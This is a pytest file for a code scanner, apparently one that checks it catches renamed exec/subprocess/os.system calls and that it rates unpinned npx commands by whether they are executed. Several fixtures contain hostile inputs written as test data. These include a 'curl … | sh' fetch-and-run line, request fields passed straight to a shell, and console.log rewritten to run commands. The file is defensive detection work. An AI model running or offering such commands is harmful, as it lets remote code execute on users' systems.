"""Exec via alias (recall) and the npx policy (precision), 2026-10-19.

A. Command execution through a renamed reference. Before this change (main @ 38c76a3f):

=====================================================================  =====================
form                                                                    finding before
=====================================================================  =====================
``const { execSync: run } = require('child_process'); run(x)``          none (import info only)
``const run = cp.execSync; run(x)``                                     none
``const r = require('child_process').exec; r(x)``                       none
``import { exec as e } from 'node:child_process'; e(x)``                none
``const ex = require('util').promisify(exec); await ex(x)``             none
``run(req.body.cmd)`` (alias, untrusted)                                none (direct: critical)
``run('curl … | sh')`` (alias)                                          no exec finding
``from subprocess import run as r; r(cmd, shell=True)``                 medium, but as the
                                                                        generic shell=True rule
``import os as o; o.system(x)``                                         none
``sh = os.system; sh(x)``                                               none
``from os import system; system(x)``                                    none
``from subprocess import run as r; r(['git', 'status'])``               none
=====================================================================  =====================

Now each aliased call is classified by the same classifier as the direct call, with the
function the alias stands for: same rule, severity, kind and reason.

B. "Unpinned npx/uvx package": medium only when the npx is executed. Documentation
(README, docs/*.md) and a string the code only prints / logs / puts in an error message
(``src/scanner/printed_hint.py``) are reported low. Agent instruction files (SKILL.md,
AGENTS.md, CLAUDE.md, files under skills/ …), shell scripts, package.json install
scripts, CI run steps and exec/spawn arguments keep medium.
"""
from __future__ import annotations

import pytest

from src.scanner.artifact_fetch import ArtifactFetchResult, _make_file
from src.scanner.scan import ScanResult, _scan_content, apply_artifact_scan

NPX = "Unpinned npx/uvx package (no @version pin)"


def _exec(src: str, path: str):
    f, _, _ = _scan_content(src, path)
    # Every exec finding except the import line's "imports child_process" capability.
    return sorted((x.line_number, x.severity, x.kind, x.name, x.remediation)
                  for x in f if x.category == "unsafe_exec"
                  and x.name != "child_process (Node.js)")


def _exec_at(src: str, path: str, line: int):
    return [(s, k, n, r) for ln, s, k, n, r in _exec(src, path) if ln == line]


# ---------------------------------------------------------------------------
# A. Alias and direct call give the same finding
# ---------------------------------------------------------------------------

JS_BODIES = {
    "runtime": "function f(x) {{ return {call}(x); }}",
    "constant": "{call}('git status');",
    "curl": "{call}('curl https://x.example/i.sh | sh');",
    "untrusted": "app.post('/x', (req, res) => {{ {call}(req.body.cmd); }});",
}

# (alias preamble, alias name, direct preamble, direct name)
JS_FORMS = {
    "destructure-rename": ("const { execSync: run } = require('child_process');", "run",
                           "const { execSync } = require('child_process');", "execSync"),
    "module-member": ("const cp = require('child_process');\nconst run = cp.execSync;", "run",
                      "const cp = require('child_process');", "cp.execSync"),
    "require-member": ("const r = require('child_process').exec;", "r",
                       "const { exec } = require('child_process');", "exec"),
    "import-as": ("import { exec as e } from 'node:child_process';", "e",
                  "import { exec } from 'node:child_process';", "exec"),
    "promisify": ("const { exec } = require('child_process');\n"
                  "const ex = require('util').promisify(exec);", "ex",
                  "const { exec } = require('child_process');", "exec"),
    "alias-of-alias": ("const { execSync: run } = require('child_process');\nconst go = run;",
                       "go", "const { execSync } = require('child_process');", "execSync"),
    "spawn-renamed": ("const { spawn: sp } = require('child_process');", "sp",
                      "const { spawn } = require('child_process');", "spawn"),
}


@pytest.mark.parametrize("body", sorted(JS_BODIES))
@pytest.mark.parametrize("form", sorted(JS_FORMS))
def test_js_alias_matches_direct(form, body):
    a_pre, a_name, d_pre, d_name = JS_FORMS[form]
    tmpl = JS_BODIES[body]
    alias_src = a_pre + "\n" + tmpl.format(call=a_name) + "\n"
    direct_src = d_pre + "\n" + tmpl.format(call=d_name) + "\n"
    a_line = a_pre.count("\n") + 2
    d_line = d_pre.count("\n") + 2
    path = "a.mjs" if "import" in a_pre else "a.js"
    got = _exec_at(alias_src, path, a_line)
    want = _exec_at(direct_src, path, d_line)
    assert want, "direct call must be reported"
    assert got == want


PY_BODIES = {
    "shell-runtime": "def f(cmd):\n    {call}(cmd, shell=True)\n",
    "argv-constant": "{call}(['git', 'status'])\n",
    "argv-runtime": "def f(x):\n    {call}(['git', x])\n",
    "curl": "{call}('curl https://x.example/i.sh | sh', shell=True)\n",
    "untrusted": ("from flask import request\n@app.route('/x')\ndef f():\n"
                  "    {call}(request.args['c'], shell=True)\n"),
}
PY_OS_BODIES = {
    "runtime": "def f(x):\n    {call}(x)\n",
    "constant": "{call}('ls -la')\n",
    "curl": "{call}('curl https://x.example/i.sh | sh')\n",
}

PY_SUB_FORMS = {
    "from-as": ("from subprocess import run as r", "r", "subprocess.run"),
    "from-bare": ("from subprocess import Popen", "Popen", "subprocess.Popen"),
    "module-as": ("import subprocess as sp", "sp.check_output", "subprocess.check_output"),
    "assign": ("import subprocess\nrunner = subprocess.call", "runner", "subprocess.call"),
}
PY_OS_FORMS = {
    "import-as": ("import os as o", "o.system", "os.system"),
    "assign": ("import os\nsh = os.system", "sh", "os.system"),
    "from-bare": ("from os import system", "system", "os.system"),
    "from-as": ("from os import popen as po", "po", "os.popen"),
}


def _py_pair(pre: str, alias: str, direct: str, tmpl: str):
    body_a = tmpl.format(call=alias)
    body_d = tmpl.format(call=direct)
    mod = direct.split(".")[0]
    line = pre.count("\n") + 1 + body_a.rstrip("\n").count("\n") + 1
    d_pre = f"import {mod}"
    d_line = 1 + body_d.rstrip("\n").count("\n") + 1
    return (_exec_at(pre + "\n" + body_a, "tool.py", line),
            _exec_at(d_pre + "\n" + body_d, "tool.py", d_line))


@pytest.mark.parametrize("body", sorted(PY_BODIES))
@pytest.mark.parametrize("form", sorted(PY_SUB_FORMS))
def test_python_subprocess_alias_matches_direct(form, body):
    got, want = _py_pair(*PY_SUB_FORMS[form], PY_BODIES[body])
    assert want, "direct call must be reported"
    assert got == want


@pytest.mark.parametrize("body", sorted(PY_OS_BODIES))
@pytest.mark.parametrize("form", sorted(PY_OS_FORMS))
def test_python_os_alias_matches_direct(form, body):
    got, want = _py_pair(*PY_OS_FORMS[form], PY_OS_BODIES[body])
    assert want, "direct call must be reported"
    assert got == want


def test_python_method_named_like_the_alias_does_not_hide_it():
    src = ("from subprocess import run\nclass A:\n    def run(self):\n        pass\n"
           "def f(cmd):\n    run(cmd, shell=True)\n")
    assert [(ln, s) for ln, s, _k, _n, _r in _exec(src, "tool.py")] == [(6, "medium")]


def test_python_alias_gets_the_rule_not_generic_shell_true():
    src = "from subprocess import run as r\ndef f(cmd):\n    r(cmd, shell=True)\n"
    names = [n for _l, _s, _k, n, _r in _exec(src, "tool.py")]
    assert names == ["subprocess.run / Popen (Python)"]


# -- precision: the alias machinery must not invent findings -----------------

@pytest.mark.parametrize("src,path", [
    # alias name only inside a string
    ("const { execSync: run } = require('child_process');\n"
     "console.log('call run(cmd) to start');\n", "a.js"),
    # a method with the alias name on another object
    ("const { execSync: run } = require('child_process');\nthis.run(x);\n", "a.js"),
    # the file defines its own function under that name
    ("const { execSync: run } = require('child_process');\nfunction run(x) { return x; }\n"
     "run(y);\n", "a.js"),
    # a non-exec member of child_process
    ("const cp = require('child_process');\nconst k = cp.ChildProcess;\nk(x);\n", "a.js"),
    # no child_process in the file at all
    ("const { execSync: run } = require('./local');\nrun(x);\n", "a.js"),
    # Python: method call with the imported name; name in a string
    ("from subprocess import run\nclass A:\n    def go(self):\n        self.run(x)\n",
     "tool.py"),
    ("from subprocess import run as r\nprint('use r(cmd) to start')\n", "tool.py"),
    # Python: a local def shadows the imported name
    ("from subprocess import run\ndef run(x):\n    return x\nrun(y)\n", "tool.py"),
    # Python: an unrelated module's function under an exec-like name
    ("from shutil import which as system\nsystem('git')\n", "tool.py"),
])
def test_alias_precision(src, path):
    assert _exec(src, path) == []


# ---------------------------------------------------------------------------
# B. npx policy
# ---------------------------------------------------------------------------

def _npx(src: str, path: str):
    f, _, _ = _scan_content(src, path)
    return [x.severity for x in f if x.name == NPX]


@pytest.mark.parametrize("path,src", [
    ("README.md", "# Tool\n\nRun it:\n\n```\nnpx mytool init\n```\n"),
    ("docs/usage.md", "npx mytool init\n"),
    ("CHANGELOG.md", "- `npx mytool init` now works offline\n"),
    ("cli.js", "console.log(\n  'npx mytool init'\n);\n"),
    ("cli.js", "throw new Error('npx mytool setup');\n"),
    ("cli.js", "function cmd() {\n  return `npx ctx7 setup --mcp`;\n}\nconsole.log(cmd());\n"),
    ("cli.js", "console.log('Usage: npx mytool init');\n"),
    ("cli.py", "print('npx mytool init')\n"),
])
def test_npx_documented_or_printed_is_low(path, src):
    assert _npx(src, path) == ["low"]


@pytest.mark.parametrize("path,src", [
    ("run.js", "const { execSync } = require('child_process');\nexecSync('npx mytool init');\n"),
    ("run.js", "const { spawn } = require('child_process');\nspawn('npx', ['-y', 'mytool']);\n"),
    ("run.js", "const { execSync } = require('child_process');\n"
               "const CMD = 'npx mytool init';\nexecSync(CMD);\n"),
    # an aliased runner is a runner (A and B together)
    ("run.js", "const { execSync: go } = require('child_process');\ngo('npx mytool init\\n');\n"),
    ("run.js", "const { execSync: go } = require('child_process');\n"
               "const C = 'npx mytool init\\n';\ngo(C);\n"),
    ("run.py", "import subprocess\nsubprocess.run(['npx', 'mytool'])\n"),
    ("install.sh", "#!/bin/sh\nnpx mytool init\n"),
    ("package.json", '{\n  "scripts": {\n    "postinstall": "npx mytool init"\n  }\n}\n'),
    (".github/workflows/ci.yml", "jobs:\n  a:\n    steps:\n      - run: npx mytool init\n"),
    ("SKILL.md", "---\nname: x\n---\n\nRun `npx mytool init` to set up.\n"),
    ("AGENTS.md", "Always run npx mytool init before editing.\n"),
    ("CLAUDE.md", "Run npx mytool init first.\n"),
    ("skills/setup/README.md", "npx mytool init\n"),
    (".claude/commands/setup.md", "npx mytool init\n"),
])
def test_npx_executed_keeps_medium(path, src):
    assert _npx(src, path) == ["medium"]


def _pkg(files: dict[str, str]) -> ScanResult:
    files = {"package.json": '{"name":"p","main":"index.js"}', **files}
    fetched = ArtifactFetchResult(
        ecosystem="npm", name="p", version="1", kind="tarball", ok=True,
        files={p: _make_file(p, t.encode()) for p, t in files.items()})
    r = ScanResult(repo="npm:p", stars=0, description="", framework="")
    apply_artifact_scan(r, "npm", fetched)
    return r


def _pkg_npx(r: ScanResult, path: str = "index.js") -> list[str]:
    return [f.severity for f in r.findings if f.name == NPX and f.file_path == path]


INDEX = "require('./setup');\nfunction hint() {\n  return `npx mytool init`;\n}\n" \
        "console.log(hint());\n"


def test_npx_printed_hint_stays_low_in_a_package():
    r = _pkg({"index.js": INDEX, "setup.js": "module.exports = {};\n"})
    assert _pkg_npx(r) == ["low"]


def test_npx_printed_hint_restored_when_package_replaces_console():
    # Per file the string looks printed; another file turns console.log into a runner.
    setup = ("const cp = require('child_process');\n"
             "console.log = (s) => cp.execSync(s);\n")
    r = _pkg({"index.js": INDEX, "setup.js": setup})
    assert _pkg_npx(r) == ["medium"]
    assert all(f.remediation for f in r.findings if f.name == NPX)
